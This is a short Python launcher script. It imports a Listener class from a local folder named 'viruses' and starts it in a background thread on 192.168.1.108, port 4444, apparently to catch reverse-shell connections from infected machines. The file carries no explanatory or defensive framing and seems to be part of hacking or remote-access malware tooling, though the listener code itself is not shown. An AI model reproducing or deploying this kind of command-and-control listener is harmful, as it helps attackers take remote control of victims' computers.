
import sys
sys.path.append("./viruses/")
from listener import *
my_listener=Listener('192.168.1.108',4444)
try:
    t=threading.Thread(target=my_listener.run,name='listener')
    t.start()
except:
    pass
